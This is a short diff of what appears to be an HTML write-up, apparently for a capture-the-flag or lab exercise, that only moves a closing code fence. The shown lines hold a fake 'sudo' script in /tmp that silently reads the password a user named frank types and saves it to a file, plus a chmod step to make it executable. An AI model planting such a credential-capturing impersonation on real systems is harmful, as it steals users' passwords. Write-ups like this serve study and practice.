@@ -46,7 +46,8 @@
                     ```
                     #!/bin/bash
 read -s pass # after executes the command, this will read the password entered by frank and store it in the pass variable
-echo $pass > /home/frank/pass.txt # echoing the password from pass variable to pass.txt so that we can read it once catured.```
+echo $pass > /home/frank/pass.txt # echoing the password from pass variable to pass.txt so that we can read it once catured.
+```
                 </li>
                 <li>
                     <code>chmod +x /tmp/sudo</code>
